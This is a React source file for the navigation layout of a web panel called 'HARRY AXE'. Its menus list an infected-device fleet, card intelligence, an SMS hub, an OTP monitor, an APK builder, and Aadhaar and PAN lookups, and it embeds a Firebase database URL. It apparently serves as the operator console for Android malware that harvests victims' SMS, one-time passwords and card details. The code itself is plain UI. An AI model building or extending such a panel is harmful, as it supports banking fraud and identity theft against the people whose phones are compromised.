import React, { useEffect, useState } from "react";
import { useAuth } from "@/lib/auth";
import { useLocation, Link } from "wouter";
import { useSearch } from "@/lib/search";
import {
  LogOut,
  Search,
  Sun,
  Moon,
  Smartphone,
  CreditCard,
  MessageSquare,
  KeyRound,
  Users,
  Send,
  Package,
  Flame,
  Settings,
  Wrench,
  TerminalSquare,
  MoreHorizontal,
  X,
  Radio,
  ExternalLink,
  ShieldCheck,
  Zap,
  Check,
  RefreshCw,
  type LucideIcon,
} from "lucide-react";

const THEME_KEY = "harryaxe-theme";

function getInitialTheme(): "dark" | "light" {
  try {
    const saved = localStorage.getItem(THEME_KEY);
    if (saved === "light" || saved === "dark") return saved;
  } catch {
    /* ignore */
  }
  return "dark";
}

interface NavItem {
  href: string;
  label: string;
  badge?: string;
  icon: LucideIcon;
  adminOnly?: boolean;
}

// ── Variation 3 Navigation Links ──────────────────────────────────────────
const navLinks: NavItem[] = [
  { href: "/dashboard", label: "FLEET", icon: Smartphone },
  { href: "/cards", label: "CARD_INTEL", icon: CreditCard },
  { href: "/all-sms", label: "SMS_HUB", icon: MessageSquare },
  { href: "/subscriptions", label: "ACCESS", icon: Users, adminOnly: true },
  { href: "/profile", label: "SYS_CONFIG", icon: Settings },
];

// ── Secondary Tools in "MORE" Drawer ─────────────────────────────────────
const secondaryLinks: NavItem[] = [
  { href: "/otps", label: "OTP Monitor", icon: KeyRound },
  { href: "/firebases", label: "Firebases & Cluster", icon: Flame },
  { href: "/telegram", label: "Telegram Bot", icon: Send },
  { href: "/apk-studio", label: "APK Studio", icon: Package },
  { href: "/tool", label: "ADHAR", icon: Wrench },
  { href: "/pam", label: "PAN FETCH", icon: TerminalSquare, adminOnly: true },
];

export function Layout({ children }: { children: React.ReactNode }) {
  const { logout, isAdmin, username } = useAuth();
  const [location, setLocation] = useLocation();
  const [theme, setTheme] = useState<"dark" | "light">(getInitialTheme);
  const [moreOpen, setMoreOpen] = useState(false);
  const [vpsModalOpen, setVpsModalOpen] = useState(false);
  const { query, setQuery, searchRef, focusSearch } = useSearch();

  useEffect(() => {
    document.documentElement.classList.toggle("dark", theme === "dark");
    try {
      localStorage.setItem(THEME_KEY, theme);
    } catch {
      /* ignore */
    }
  }, [theme]);

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
        e.preventDefault();
        focusSearch();
      }
      if (e.key === "Escape") {
        setMoreOpen(false);
        setVpsModalOpen(false);
      }
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, []);

  const handleLogout = () => {
    logout();
    setLocation("/");
  };

  const isActive = (href: string) => {
    if (href === "/cards" && location === "/data") return true;
    return location === href || (href !== "/" && location.startsWith(href + "/"));
  };

  const visibleNav = navLinks.filter((l) => !l.adminOnly || isAdmin);

  return (
    <div className="min-h-dvh flex flex-col bg-background text-foreground font-sans relative">
      {/* ── Variation 3 Top Bar Header ── */}
      <header className="sticky top-0 z-40 border-b border-border bg-background/85 backdrop-blur-xl px-4 sm:px-8 py-3.5 flex items-center justify-between gap-4 transition-all">
        {/* Left: Brand Identity */}
        <div className="flex items-center gap-6 shrink-0">
          <Link href="/dashboard" className="flex items-center gap-3 group">
            <div className="w-8 h-8 rounded bg-primary text-primary-foreground font-display font-black text-lg flex items-center justify-center shadow-[0_0_15px_rgba(0,119,255,0.6)] group-hover:scale-105 transition-transform">
              H
            </div>
            <div className="flex flex-col">
              <span className="font-display text-xl tracking-tight text-foreground font-bold leading-none">
                HARRY AXE
              </span>
              <span className="meta text-[9px] text-muted-foreground tracking-widest mt-0.5 hidden sm:block">
                WEBPANEL
              </span>
              {import.meta.env.PROD && (
                <span className="meta text-[8px] font-bold tracking-widest mt-0.5 text-[#00FFCC]">
                  PROD · LIVE
                </span>
              )}
            </div>
          </Link>

          {/* Desktop Nav Links */}
          <nav className="hidden lg:flex items-center gap-6 ml-2">
            {visibleNav.map((link) => {
              const active = isActive(link.href);
              return (
                <Link
                  key={link.href}
                  href={link.href}
                  className={`font-mono text-xs uppercase tracking-wider transition-all duration-150 py-1 border-b-2 ${
                    active
                      ? "text-primary border-primary font-bold shadow-[0_4px_12px_-4px_rgba(0,119,255,0.5)]"
                      : "text-foreground/70 hover:text-foreground border-transparent hover:border-border"
                  }`}
                >
                  {link.label}
                </Link>
              );
            })}

            {/* More tools dropdown / drawer trigger */}
            <button
              onClick={() => setMoreOpen(true)}
              className="font-mono text-xs uppercase tracking-wider text-muted-foreground hover:text-foreground transition-colors flex items-center gap-1"
            >
              MORE <MoreHorizontal className="w-3.5 h-3.5" />
            </button>
          </nav>
        </div>

        {/* Center: Search input (Medium+ screens) */}
        <div className="hidden md:flex flex-1 max-w-xs xl:max-w-md mx-2">
          <div className="relative w-full">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
            <input
              ref={searchRef}
              data-search
              type="text"
              value={query}
              onChange={(e) => setQuery(e.target.value)}
              placeholder="SEARCH_TELEMETRY (CTRL+K)..."
              className="w-full bg-card/60 border border-border rounded px-3 py-1.5 pl-8 pr-12 text-xs font-mono text-foreground placeholder:text-muted-foreground/60 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all"
            />
            <kbd className="absolute right-2 top-1/2 -translate-y-1/2 text-[9px] font-mono bg-muted/60 text-muted-foreground px-1.5 py-0.5 rounded border border-border">
              ^K
            </kbd>
          </div>
        </div>

        {/* Right: Telemetry sync status, admin badge, actions */}
        <div className="flex items-center gap-2.5 sm:gap-4 shrink-0">
          {/* Live system sync telemetry indicator with pulsing ring */}
          <button
            onClick={() => setVpsModalOpen(true)}
            title="Inspect VPS & Firebase Telemetry Sync"
            className="flex items-center gap-2 px-2.5 py-1.5 rounded border border-border bg-card/40 hover:border-primary/50 transition-all cursor-pointer group"
          >
            <span className="status-indicator">
              <span className="ping-ring" />
              <span className="status-dot online" />
            </span>
            <span className="meta text-[#00FFCC] font-bold text-[10px] hidden sm:inline">
              • SYSTEM_SYNCED
            </span>
          </button>

          {/* Admin badge */}
          <button
            onClick={() => setLocation("/profile")}
            className="action-btn text-[10px] font-bold py-1 px-2.5"
            title="User Profile & System Settings"
          >
            {isAdmin ? "E_ADMIN" : (username || "USER").toUpperCase()}
          </button>

          {/* Theme switcher */}
          <button
            onClick={() => setTheme((t) => (t === "dark" ? "light" : "dark"))}
            className="p-1.5 rounded border border-border text-muted-foreground hover:text-foreground hover:border-primary/50 transition-colors"
            title="Toggle Theme"
          >
            {theme === "dark" ? <Sun className="w-3.5 h-3.5" /> : <Moon className="w-3.5 h-3.5" />}
          </button>

          {/* Logout */}
          <button
            onClick={handleLogout}
            className="p-1.5 rounded border border-border text-muted-foreground hover:text-destructive hover:border-destructive/40 transition-colors"
            title="Sign Out"
          >
            <LogOut className="w-3.5 h-3.5" />
          </button>
        </div>
      </header>

      {/* ── Main Workspace Body ── */}
      <main className="flex-1 w-full max-w-[1700px] mx-auto p-4 sm:p-6 lg:p-8 pb-24 md:pb-8">
        {children}
      </main>

      {/* ── Mobile Bottom Navigation Bar (Optimized for touch) ── */}
      <nav className="lg:hidden fixed bottom-0 left-0 right-0 z-40 bg-background/95 backdrop-blur-lg border-t border-border px-2 py-1 flex items-center justify-around shadow-2xl">
        <Link
          href="/dashboard"
          className={`flex flex-col items-center justify-center gap-1 py-1.5 px-3 rounded min-h-[48px] text-[10px] font-mono uppercase tracking-wider transition-colors active:scale-95 ${
            isActive("/dashboard") ? "text-primary font-bold" : "text-muted-foreground"
          }`}
        >
          <Smartphone className="w-4 h-4" />
          <span>FLEET</span>
        </Link>
        <Link
          href="/cards"
          className={`flex flex-col items-center justify-center gap-1 py-1.5 px-3 rounded min-h-[48px] text-[10px] font-mono uppercase tracking-wider transition-colors active:scale-95 ${
            isActive("/cards") ? "text-primary font-bold" : "text-muted-foreground"
          }`}
        >
          <CreditCard className="w-4 h-4" />
          <span>CARDS</span>
        </Link>
        <Link
          href="/all-sms"
          className={`flex flex-col items-center justify-center gap-1 py-1.5 px-3 rounded min-h-[48px] text-[10px] font-mono uppercase tracking-wider transition-colors active:scale-95 ${
            isActive("/all-sms") ? "text-primary font-bold" : "text-muted-foreground"
          }`}
        >
          <MessageSquare className="w-4 h-4" />
          <span>SMS</span>
        </Link>
        <button
          onClick={() => setMoreOpen(true)}
          className={`flex flex-col items-center justify-center gap-1 py-1.5 px-3 rounded min-h-[48px] text-[10px] font-mono uppercase tracking-wider transition-colors active:scale-95 ${
            moreOpen ? "text-primary font-bold" : "text-muted-foreground"
          }`}
        >
          <MoreHorizontal className="w-4 h-4" />
          <span>MORE</span>
        </button>
      </nav>

      {/* ── "More Tools" Slide-Over Drawer ── */}
      {moreOpen && (
        <div className="fixed inset-0 z-50 flex">
          <div
            className="fixed inset-0 bg-black/70 backdrop-blur-sm transition-opacity"
            onClick={() => setMoreOpen(false)}
          />
          <div className="relative ml-auto w-full max-w-sm h-full bg-card border-l border-border p-6 shadow-2xl flex flex-col justify-between overflow-y-auto z-10 animate-in slide-in-from-right duration-200">
            <div>
              <div className="flex items-center justify-between pb-4 border-b border-border mb-6">
                <div>
                  <span className="meta text-[10px] block">SYSTEM_UTILITIES</span>
                  <h3 className="font-display text-xl font-bold text-foreground">
                    Secondary_Tools
                  </h3>
                </div>
                <button
                  onClick={() => setMoreOpen(false)}
                  className="p-2 rounded border border-border text-muted-foreground hover:text-foreground hover:border-primary/50"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div className="space-y-2">
                <span className="meta text-[10px] text-muted-foreground block px-2 mb-1">
                  TOOLS & INTEGRATIONS
                </span>
                {secondaryLinks.map((link) => {
                  const active = isActive(link.href);
                  const Icon = link.icon;
                  return (
                    <Link
                      key={link.href}
                      href={link.href}
                      onClick={() => setMoreOpen(false)}
                      className={`flex items-center gap-3 p-3 rounded border transition-all ${
                        active
                          ? "border-primary bg-primary/10 text-primary font-bold"
                          : "border-border bg-background/50 text-foreground hover:border-border/80 hover:bg-muted/40"
                      }`}
                    >
                      <Icon className="w-4 h-4 shrink-0" />
                      <span className="font-mono text-xs font-semibold">{link.label}</span>
                    </Link>
                  );
                })}

                {isAdmin && (
                  <Link
                    href="/subscriptions"
                    onClick={() => setMoreOpen(false)}
                    className={`flex items-center gap-3 p-3 rounded border transition-all ${
                      isActive("/subscriptions")
                        ? "border-primary bg-primary/10 text-primary font-bold"
                        : "border-border bg-background/50 text-foreground hover:border-border/80 hover:bg-muted/40"
                    }`}
                  >
                    <Users className="w-4 h-4 shrink-0" />
                    <span className="font-mono text-xs font-semibold">ACCESS (Users & Subscriptions)</span>
                  </Link>
                )}

                <Link
                  href="/profile"
                  onClick={() => setMoreOpen(false)}
                  className={`flex items-center gap-3 p-3 rounded border transition-all ${
                    isActive("/profile")
                      ? "border-primary bg-primary/10 text-primary font-bold"
                      : "border-border bg-background/50 text-foreground hover:border-border/80 hover:bg-muted/40"
                  }`}
                >
                  <Settings className="w-4 h-4 shrink-0" />
                  <span className="font-mono text-xs font-semibold">SYS_CONFIG (Credentials & Firebase)</span>
                </Link>
              </div>
            </div>

            <div className="pt-6 border-t border-border">
              <button
                onClick={() => {
                  setMoreOpen(false);
                  setVpsModalOpen(true);
                }}
                className="w-full action-btn text-xs py-2.5 mb-2"
              >
                <Radio className="w-3.5 h-3.5 text-[#00FFCC]" />
                TELEMETRY_SYNC_STATUS
              </button>
              <button
                onClick={handleLogout}
                className="w-full action-btn text-xs py-2 text-destructive hover:border-destructive hover:text-destructive"
              >
                <LogOut className="w-3.5 h-3.5" />
                TERMINATE_SESSION
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ── Telemetry & VPS Sync Modal ── */}
      {vpsModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-sm animate-in fade-in">
          <div className="w-full max-w-lg rounded-lg border border-border bg-card p-6 shadow-2xl relative">
            <div className="flex items-center justify-between pb-3 border-b border-border mb-4">
              <div className="flex items-center gap-2">
                <span className="status-dot online" />
                <div>
                  <span className="meta text-[9px]">DIAGNOSTIC_TELEMETRY</span>
                  <h3 className="font-display text-lg font-bold text-foreground">
                    Telemetry & VPS Sync
                  </h3>
                </div>
              </div>
              <button
                onClick={() => setVpsModalOpen(false)}
                className="p-1 rounded text-muted-foreground hover:text-foreground"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="space-y-3 font-mono text-xs">
              <div className="p-3 rounded bg-background/80 border border-border space-y-1">
                <span className="meta text-[9px] block">PANEL_ORIGIN</span>
                <p className="text-primary font-bold break-all">
                  {typeof window !== "undefined" ? window.location.origin : "Auto-detected"}
                </p>
              </div>

              <div className="p-3 rounded bg-background/80 border border-border space-y-1">
                <span className="meta text-[9px] block">FIREBASE_REST_CLUSTER</span>
                <p className="text-foreground break-all">
                  https://ai-studio-parivahanpanelsy-6c13f1e6-6bb4-468a-bd85-63d32d32229e-default-rtdb.asia-southeast1.firebasedatabase.app
                </p>
              </div>

              <div className="p-3 rounded bg-background/80 border border-border flex items-center justify-between">
                <div>
                  <span className="meta text-[9px] block">DATABASE_STATUS</span>
                  <span className="text-[#00FFCC] font-bold">ONLINE & SYNCED</span>
                </div>
                <span className="status-dot online" />
              </div>
            </div>

            <div className="mt-6 flex items-center justify-end gap-2">
              <button
                onClick={() => setVpsModalOpen(false)}
                className="action-btn"
              >
                DISMISS
              </button>
              <button
                onClick={() => {
                  window.location.reload();
                }}
                className="action-btn primary"
              >
                RELOAD_STREAM
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
